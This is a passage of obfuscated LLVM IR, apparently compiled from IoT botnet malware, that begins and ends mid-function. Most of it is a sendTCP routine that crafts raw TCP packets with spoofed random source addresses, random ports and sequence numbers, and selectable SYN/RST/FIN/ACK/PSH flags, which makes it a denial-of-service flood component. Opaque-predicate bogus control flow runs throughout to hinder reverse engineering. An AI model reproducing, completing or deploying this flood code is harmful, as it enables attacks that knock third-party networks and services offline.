  %40 = load i32, i32* %8, align 4
  %41 = call i32 @close(i32 %40)
  %42 = load i32, i32* @x.71
  %43 = load i32, i32* @y.72
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:50:                                     ; preds = %22
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %26
  %51 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %51, i32* %8, align 4
  %52 = load i32, i32* %8, align 4
  %53 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %54 = call i32 @connect(i32 %52, %struct.sockaddr* %53, i32 16)
  %55 = call i32 @sleep(i32 1)
  %56 = load i32, i32* %8, align 4
  %57 = call i32 @close(i32 %56)
  br label %originalBB
}

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %8 = load i32, i32* @x.73
  %9 = load i32, i32* @y.74
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.sockaddr_in, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %16, align 8
  store i32 %1, i32* %17, align 4
  store i32 %2, i32* %18, align 4
  store i8* %3, i8** %19, align 8
  store i32 %4, i32* %20, align 4
  store i32 %5, i32* %21, align 4
  store i32 %6, i32* %22, align 4
  %34 = load i32, i32* %21, align 4
  store i32 %34, i32* %23, align 4
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %35, align 4
  %36 = load i32, i32* %17, align 4
  %37 = icmp eq i32 %36, 0
  %38 = load i32, i32* @x.73
  %39 = load i32, i32* @y.74
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %37, label %46, label %50

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = call i32 @rand_cmwc()
  %48 = trunc i32 %47 to i16
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %48, i16* %49, align 2
  br label %71

; <label>:50:                                     ; preds = %originalBBpart2
  %51 = load i32, i32* @x.73
  %52 = load i32, i32* @y.74
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %50
  %59 = load i32, i32* %17, align 4
  %60 = trunc i32 %59 to i16
  %61 = call zeroext i16 @htons(i16 zeroext %60) #13
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %61, i16* %62, align 2
  %63 = load i32, i32* @x.73
  %64 = load i32, i32* @y.74
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %71

; <label>:71:                                     ; preds = %originalBBpart24, %46
  %72 = load i8*, i8** %16, align 8
  %73 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %74 = call i32 @getHost(i8* %72, %struct.in_addr* %73)
  %75 = icmp ne i32 %74, 0
  br i1 %75, label %76, label %93

; <label>:76:                                     ; preds = %71
  %77 = load i32, i32* @x.73
  %78 = load i32, i32* @y.74
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %76
  %85 = load i32, i32* @x.73
  %86 = load i32, i32* @y.74
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %620

; <label>:93:                                     ; preds = %71
  %94 = load i32, i32* @x.73
  %95 = load i32, i32* @y.74
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %93
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 3
  %103 = getelementptr inbounds [8 x i8], [8 x i8]* %102, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %103, i8 0, i64 8, i32 4, i1 false)
  %104 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %104, i32* %25, align 4
  %105 = load i32, i32* %25, align 4
  %106 = icmp ne i32 %105, 0
  %107 = load i32, i32* @x.73
  %108 = load i32, i32* @y.74
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %106, label %132, label %115

; <label>:115:                                    ; preds = %originalBBpart212
  %116 = load i32, i32* @x.73
  %117 = load i32, i32* @y.74
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %115
  %124 = load i32, i32* @x.73
  %125 = load i32, i32* @y.74
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %620

; <label>:132:                                    ; preds = %originalBBpart212
  %133 = load i32, i32* @x.73
  %134 = load i32, i32* @y.74
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %132
  store i32 1, i32* %26, align 4
  %141 = load i32, i32* %25, align 4
  %142 = bitcast i32* %26 to i8*
  %143 = call i32 @setsockopt(i32 %141, i32 0, i32 3, i8* %142, i32 4) #2
  %144 = icmp slt i32 %143, 0
  %145 = load i32, i32* @x.73
  %146 = load i32, i32* @y.74
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %144, label %153, label %170

; <label>:153:                                    ; preds = %originalBBpart220
  %154 = load i32, i32* @x.73
  %155 = load i32, i32* @y.74
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %153
  %162 = load i32, i32* @x.73
  %163 = load i32, i32* @y.74
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %620

; <label>:170:                                    ; preds = %originalBBpart220
  %171 = load i32, i32* %22, align 4
  %172 = icmp eq i32 %171, 0
  br i1 %172, label %173, label %174

; <label>:173:                                    ; preds = %170
  store i32 0, i32* %27, align 4
  br label %180

; <label>:174:                                    ; preds = %170
  %175 = load i32, i32* %22, align 4
  %176 = sub nsw i32 32, %175
  %177 = shl i32 1, %176
  %178 = sub nsw i32 %177, 1
  %179 = xor i32 %178, -1
  store i32 %179, i32* %27, align 4
  br label %180

; <label>:180:                                    ; preds = %174, %173
  %181 = load i32, i32* %20, align 4
  %182 = sext i32 %181 to i64
  %183 = add i64 40, %182
  %184 = call i8* @llvm.stacksave()
  store i8* %184, i8** %28, align 8
  %185 = alloca i8, i64 %183, align 16
  %186 = bitcast i8* %185 to %struct.iphdr*
  store %struct.iphdr* %186, %struct.iphdr** %29, align 8
  %187 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %188 = bitcast %struct.iphdr* %187 to i8*
  %189 = getelementptr i8, i8* %188, i64 20
  %190 = bitcast i8* %189 to %struct.tcphdr*
  store %struct.tcphdr* %190, %struct.tcphdr** %30, align 8
  %191 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %192 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %193 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %192, i32 0, i32 0
  %194 = load i32, i32* %193, align 4
  %195 = load i32, i32* %27, align 4
  %196 = call i32 @getRandomIP(i32 %195)
  %197 = call i32 @htonl(i32 %196) #13
  %198 = load i32, i32* %20, align 4
  %199 = sext i32 %198 to i64
  %200 = add i64 20, %199
  %201 = trunc i64 %200 to i32
  call void @makeIPPacket(%struct.iphdr* %191, i32 %194, i32 %197, i8 zeroext 6, i32 %201)
  %202 = call i32 @rand_cmwc()
  %203 = trunc i32 %202 to i16
  %204 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 0
  %206 = bitcast %union.anon.0* %205 to %struct.anon.1*
  %207 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %206, i32 0, i32 0
  store i16 %203, i16* %207, align 4
  %208 = call i32 @rand_cmwc()
  %209 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 0
  %211 = bitcast %union.anon.0* %210 to %struct.anon.1*
  %212 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %211, i32 0, i32 2
  store i32 %208, i32* %212, align 4
  %213 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  %215 = bitcast %union.anon.0* %214 to %struct.anon.1*
  %216 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %215, i32 0, i32 3
  store i32 0, i32* %216, align 4
  %217 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 0
  %219 = bitcast %union.anon.0* %218 to %struct.anon.1*
  %220 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %219, i32 0, i32 4
  %221 = load i16, i16* %220, align 4
  %222 = and i16 %221, -241
  %223 = or i16 %222, 80
  store i16 %223, i16* %220, align 4
  %224 = load i8*, i8** %19, align 8
  %225 = call i32 @strcmp(i8* %224, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.83, i32 0, i32 0)) #10
  %226 = icmp ne i32 %225, 0
  br i1 %226, label %263, label %227

; <label>:227:                                    ; preds = %180
  %228 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 0
  %230 = bitcast %union.anon.0* %229 to %struct.anon.1*
  %231 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %230, i32 0, i32 4
  %232 = load i16, i16* %231, align 4
  %233 = and i16 %232, -513
  %234 = or i16 %233, 512
  store i16 %234, i16* %231, align 4
  %235 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 0
  %237 = bitcast %union.anon.0* %236 to %struct.anon.1*
  %238 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %237, i32 0, i32 4
  %239 = load i16, i16* %238, align 4
  %240 = and i16 %239, -1025
  %241 = or i16 %240, 1024
  store i16 %241, i16* %238, align 4
  %242 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %243 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %242, i32 0, i32 0
  %244 = bitcast %union.anon.0* %243 to %struct.anon.1*
  %245 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %246, -257
  %248 = or i16 %247, 256
  store i16 %248, i16* %245, align 4
  %249 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %250 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %249, i32 0, i32 0
  %251 = bitcast %union.anon.0* %250 to %struct.anon.1*
  %252 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %251, i32 0, i32 4
  %253 = load i16, i16* %252, align 4
  %254 = and i16 %253, -4097
  %255 = or i16 %254, 4096
  store i16 %255, i16* %252, align 4
  %256 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %257 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %256, i32 0, i32 0
  %258 = bitcast %union.anon.0* %257 to %struct.anon.1*
  %259 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %258, i32 0, i32 4
  %260 = load i16, i16* %259, align 4
  %261 = and i16 %260, -2049
  %262 = or i16 %261, 2048
  store i16 %262, i16* %259, align 4
  br label %449

; <label>:263:                                    ; preds = %180
  %264 = load i32, i32* @x.73
  %265 = load i32, i32* @y.74
  %266 = sub i32 %264, 1
  %267 = mul i32 %264, %266
  %268 = urem i32 %267, 2
  %269 = icmp eq i32 %268, 0
  %270 = icmp slt i32 %265, 10
  %271 = or i1 %269, %270
  br i1 %271, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %263
  %272 = load i8*, i8** %19, align 8
  %273 = call i8* @strtok(i8* %272, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %273, i8** %31, align 8
  %274 = load i32, i32* @x.73
  %275 = load i32, i32* @y.74
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %282

; <label>:282:                                    ; preds = %430, %originalBBpart228
  %283 = load i8*, i8** %31, align 8
  %284 = icmp ne i8* %283, null
  br i1 %284, label %285, label %432

; <label>:285:                                    ; preds = %282
  %286 = load i8*, i8** %31, align 8
  %287 = call i32 @strcmp(i8* %286, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i32 0, i32 0)) #10
  %288 = icmp ne i32 %287, 0
  br i1 %288, label %313, label %289

; <label>:289:                                    ; preds = %285
  %290 = load i32, i32* @x.73
  %291 = load i32, i32* @y.74
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %289
  %298 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i32 0, i32 0
  %300 = bitcast %union.anon.0* %299 to %struct.anon.1*
  %301 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %300, i32 0, i32 4
  %302 = load i16, i16* %301, align 4
  %303 = and i16 %302, -513
  %304 = or i16 %303, 512
  store i16 %304, i16* %301, align 4
  %305 = load i32, i32* @x.73
  %306 = load i32, i32* @y.74
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBBpart246, label %originalBB30alteredBB

originalBBpart246:                                ; preds = %originalBB30
  br label %430

; <label>:313:                                    ; preds = %285
  %314 = load i8*, i8** %31, align 8
  %315 = call i32 @strcmp(i8* %314, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i32 0, i32 0)) #10
  %316 = icmp ne i32 %315, 0
  br i1 %316, label %325, label %317

; <label>:317:                                    ; preds = %313
  %318 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.0* %319 to %struct.anon.1*
  %321 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %320, i32 0, i32 4
  %322 = load i16, i16* %321, align 4
  %323 = and i16 %322, -1025
  %324 = or i16 %323, 1024
  store i16 %324, i16* %321, align 4
  br label %413

; <label>:325:                                    ; preds = %313
  %326 = load i32, i32* @x.73
  %327 = load i32, i32* @y.74
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %325
  %334 = load i8*, i8** %31, align 8
  %335 = call i32 @strcmp(i8* %334, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i32 0, i32 0)) #10
  %336 = icmp ne i32 %335, 0
  %337 = load i32, i32* @x.73
  %338 = load i32, i32* @y.74
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %336, label %353, label %345

; <label>:345:                                    ; preds = %originalBBpart250
  %346 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %347 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %346, i32 0, i32 0
  %348 = bitcast %union.anon.0* %347 to %struct.anon.1*
  %349 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %348, i32 0, i32 4
  %350 = load i16, i16* %349, align 4
  %351 = and i16 %350, -257
  %352 = or i16 %351, 256
  store i16 %352, i16* %349, align 4
  br label %396

; <label>:353:                                    ; preds = %originalBBpart250
  %354 = load i8*, i8** %31, align 8
  %355 = call i32 @strcmp(i8* %354, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.88, i32 0, i32 0)) #10
  %356 = icmp ne i32 %355, 0
  br i1 %356, label %365, label %357

; <label>:357:                                    ; preds = %353
  %358 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %359 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %358, i32 0, i32 0
  %360 = bitcast %union.anon.0* %359 to %struct.anon.1*
  %361 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %360, i32 0, i32 4
  %362 = load i16, i16* %361, align 4
  %363 = and i16 %362, -4097
  %364 = or i16 %363, 4096
  store i16 %364, i16* %361, align 4
  br label %395

; <label>:365:                                    ; preds = %353
  %366 = load i8*, i8** %31, align 8
  %367 = call i32 @strcmp(i8* %366, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i32 0, i32 0)) #10
  %368 = icmp ne i32 %367, 0
  br i1 %368, label %377, label %369

; <label>:369:                                    ; preds = %365
  %370 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %371 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %370, i32 0, i32 0
  %372 = bitcast %union.anon.0* %371 to %struct.anon.1*
  %373 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %372, i32 0, i32 4
  %374 = load i16, i16* %373, align 4
  %375 = and i16 %374, -2049
  %376 = or i16 %375, 2048
  store i16 %376, i16* %373, align 4
  br label %394

; <label>:377:                                    ; preds = %365
  %378 = load i32, i32* @x.73
  %379 = load i32, i32* @y.74
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %377
  %386 = load i32, i32* @x.73
  %387 = load i32, i32* @y.74
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %394

; <label>:394:                                    ; preds = %originalBBpart254, %369
  br label %395

; <label>:395:                                    ; preds = %394, %357
  br label %396

; <label>:396:                                    ; preds = %395, %345
  %397 = load i32, i32* @x.73
  %398 = load i32, i32* @y.74
  %399 = sub i32 %397, 1
  %400 = mul i32 %397, %399
  %401 = urem i32 %400, 2
  %402 = icmp eq i32 %401, 0
  %403 = icmp slt i32 %398, 10
  %404 = or i1 %402, %403
  br i1 %404, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %396
  %405 = load i32, i32* @x.73
  %406 = load i32, i32* @y.74
  %407 = sub i32 %405, 1
  %408 = mul i32 %405, %407
  %409 = urem i32 %408, 2
  %410 = icmp eq i32 %409, 0
  %411 = icmp slt i32 %406, 10
  %412 = or i1 %410, %411
  br i1 %412, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br label %413

; <label>:413:                                    ; preds = %originalBBpart258, %317
  %414 = load i32, i32* @x.73
  %415 = load i32, i32* @y.74
  %416 = sub i32 %414, 1
  %417 = mul i32 %414, %416
  %418 = urem i32 %417, 2
  %419 = icmp eq i32 %418, 0
  %420 = icmp slt i32 %415, 10
  %421 = or i1 %419, %420
  br i1 %421, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %413
  %422 = load i32, i32* @x.73
  %423 = load i32, i32* @y.74
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br label %430

; <label>:430:                                    ; preds = %originalBBpart262, %originalBBpart246
  %431 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %431, i8** %31, align 8
  br label %282

; <label>:432:                                    ; preds = %282
  %433 = load i32, i32* @x.73
  %434 = load i32, i32* @y.74
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %432
  %441 = load i32, i32* @x.73
  %442 = load i32, i32* @y.74
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %449

; <label>:449:                                    ; preds = %originalBBpart266, %227
  %450 = call i32 @rand_cmwc()
  %451 = trunc i32 %450 to i16
  %452 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %453 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %452, i32 0, i32 0
  %454 = bitcast %union.anon.0* %453 to %struct.anon.1*
  %455 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %454, i32 0, i32 5
  store i16 %451, i16* %455, align 2
  %456 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %457 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %456, i32 0, i32 0
  %458 = bitcast %union.anon.0* %457 to %struct.anon.1*
  %459 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %458, i32 0, i32 6
  store i16 0, i16* %459, align 4
  %460 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %461 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %460, i32 0, i32 0
  %462 = bitcast %union.anon.0* %461 to %struct.anon.1*
  %463 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %462, i32 0, i32 7
  store i16 0, i16* %463, align 2
  %464 = load i32, i32* %17, align 4
  %465 = icmp eq i32 %464, 0
  br i1 %465, label %466, label %484

; <label>:466:                                    ; preds = %449
  %467 = load i32, i32* @x.73
  %468 = load i32, i32* @y.74
  %469 = sub i32 %467, 1
  %470 = mul i32 %467, %469
  %471 = urem i32 %470, 2
  %472 = icmp eq i32 %471, 0
  %473 = icmp slt i32 %468, 10
  %474 = or i1 %472, %473
  br i1 %474, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %466
  %475 = call i32 @rand_cmwc()
  %476 = load i32, i32* @x.73
  %477 = load i32, i32* @y.74
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %489

; <label>:484:                                    ; preds = %449
  %485 = load i32, i32* %17, align 4
  %486 = trunc i32 %485 to i16
  %487 = call zeroext i16 @htons(i16 zeroext %486) #13
  %488 = zext i16 %487 to i32
  br label %489

; <label>:489:                                    ; preds = %484, %originalBBpart270
  %490 = phi i32 [ %475, %originalBBpart270 ], [ %488, %484 ]
  %491 = trunc i32 %490 to i16
  %492 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %493 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %492, i32 0, i32 0
  %494 = bitcast %union.anon.0* %493 to %struct.anon.1*
  %495 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %494, i32 0, i32 1
  store i16 %491, i16* %495, align 2
  %496 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %497 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %498 = call zeroext i16 @tcpcsum(%struct.iphdr* %496, %struct.tcphdr* %497)
  %499 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %500 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %499, i32 0, i32 0
  %501 = bitcast %union.anon.0* %500 to %struct.anon.1*
  %502 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %501, i32 0, i32 6
  store i16 %498, i16* %502, align 4
  %503 = bitcast i8* %185 to i16*
  %504 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %505 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %504, i32 0, i32 2
  %506 = load i16, i16* %505, align 2
  %507 = zext i16 %506 to i32
  %508 = call zeroext i16 @csum(i16* %503, i32 %507)
  %509 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %510 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %509, i32 0, i32 7
  store i16 %508, i16* %510, align 2
  %511 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %512 = load i32, i32* %18, align 4
  %513 = add nsw i32 %511, %512
  store i32 %513, i32* %32, align 4
